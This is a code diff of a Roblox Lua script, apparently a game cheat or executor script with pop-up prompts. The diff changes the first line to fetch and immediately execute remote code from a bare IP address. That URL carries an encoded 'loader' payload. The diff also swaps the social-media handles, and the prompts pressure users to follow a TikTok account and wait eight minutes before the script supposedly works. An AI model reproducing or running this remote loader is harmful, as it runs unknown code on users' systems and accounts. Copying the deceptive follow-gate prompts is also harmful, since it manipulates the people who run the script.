@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/dB7dJfab8BeqGERH/raw", true))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjBlZmZlNWViLTVkZTctNDkwMS1hMWE4LTBkNzNkYmYzMzM1MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
 
 -- SERVICES
 local TweenService = game:GetService("TweenService")
@@ -92,7 +92,7 @@ for i = 1, 150 do
 end
 
 -- COPY DISCORD INVITE BUTTON
-local discordInvite = "https://discord.gg/A65B7WSw"
+local discordInvite = "https://discord.gg/MvVBAxhQyR"
 
 local copyDiscordButton = Instance.new("TextButton")
 copyDiscordButton.Name = "CopyDiscordButton"
@@ -270,8 +270,8 @@ local function createPrompt(text, yesCallback, noCallback)
     copyYouTubeBtn.MouseButton1Click:Connect(function()
         pcall(function()
             if setclipboard then
-                setclipboard("Filtpants")
-                copyPopup.Text = "Copied YouTube Username!"
+                setclipboard("Filtpants_onyt")
+                copyPopup.Text = "Copied TikTok Username!"
                 copyPopup.Visible = true
                 task.delay(2, function()
                     if copyPopup then
@@ -377,7 +377,7 @@ end
 -- QUEST FLOW WITH ERROR HANDLING
 pcall(function()
     createPrompt("Hello, Sir. Before continuing, would you like to do a quest?", function()
-        createPrompt("Hello Follow @filtpantsmain on tiktok for the script to work. If you already did, please click yes and wait for 8 minutes.", function()
+        createPrompt("Hello Follow @filtpants_onyt on tiktok for the script to work. If you already did, please click yes and wait for 8 minutes.", function()
             createPrompt("Did you follow?", function()
                 createPrompt("Are you sure you followed?", function()
                     showLoadingUI()
